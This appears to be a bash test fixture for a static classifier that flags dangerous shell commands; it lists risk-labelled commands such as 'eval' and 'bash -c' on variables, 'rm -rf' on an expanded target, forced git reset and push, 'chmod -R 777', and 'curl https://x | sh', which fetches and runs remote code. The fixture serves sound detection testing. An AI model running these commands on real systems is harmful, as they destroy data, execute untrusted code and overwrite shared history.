#!/usr/bin/env bash
# Fixture for strict-risk / dangerous-command classification tests.
# This script is NEVER executed by the introspector; it is parsed statically.
set -euo pipefail

danger() {
    eval "$cmd"                 # critical: dynamic-execution
    bash -c "$payload"          # critical: dynamic-execution
    sh -c "$other"              # critical: dynamic-execution
    source "$plugin"            # high: dynamic-source (external)
    source "$0"                 # critical: dynamic-execution (self re-entry)
    rm -rf "$target"            # critical: filesystem-delete (rm -rf + expansion)
    git reset --hard            # critical: git-mutation
    git clean -fd               # critical: git-mutation
    git push --force origin     # critical: git-mutation
    curl https://x | sh         # critical: network-exec
    truncate -s 0 file.txt      # high: filesystem-write
    chmod -R 777 dir            # high: filesystem-perms
    chown -R user dir           # high: filesystem-perms
    rsync -a --delete src dst   # high: filesystem-delete
    npm install                 # high: installer
    # prose mention of rm -rf and eval here must NOT register as commands
}
